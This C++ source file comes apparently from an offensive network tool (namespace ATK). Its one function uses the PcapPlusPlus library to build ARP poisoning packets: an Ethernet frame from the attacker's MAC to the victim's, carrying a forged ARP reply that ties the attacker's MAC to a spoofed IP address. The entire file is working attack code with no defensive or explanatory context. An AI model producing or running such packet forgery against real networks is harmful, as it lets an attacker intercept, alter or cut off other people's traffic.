#include "arp/create_packet.h"
#include "ArpLayer.h"
#include "EthLayer.h"
#include <stdexcept>

pcpp::Packet ATK::ARP::createPacket(ARP::ArpPoisoningPacketPayload &payload) {

    // Build ARP spoofing packet
    pcpp::EthLayer ethLayer(payload.macAttacker, payload.macVictim,
                            PCPP_ETHERTYPE_ARP);

    pcpp::ArpLayer arpLayer(pcpp::ARP_REPLY, payload.macAttacker,
                            payload.macVictim, payload.ipToSpoof,
                            payload.ipVictim);

    pcpp::Packet packet(ARP::MAX_PACKET_LEN);

    if (!packet.addLayer(&ethLayer)) {
        throw std::runtime_error("Failed to create Ethernet layer" +
                                 payload.macAttacker.toString() +
                                 payload.macVictim.toString());
    };

    if (!packet.addLayer(&arpLayer)) {
        throw std::runtime_error(
            "Failed to create ARP reply" + payload.macAttacker.toString() +
            payload.macVictim.toString() + payload.ipToSpoof.toString() +
            payload.ipVictim.toString());
    };

    packet.computeCalculateFields();

    return packet;
}
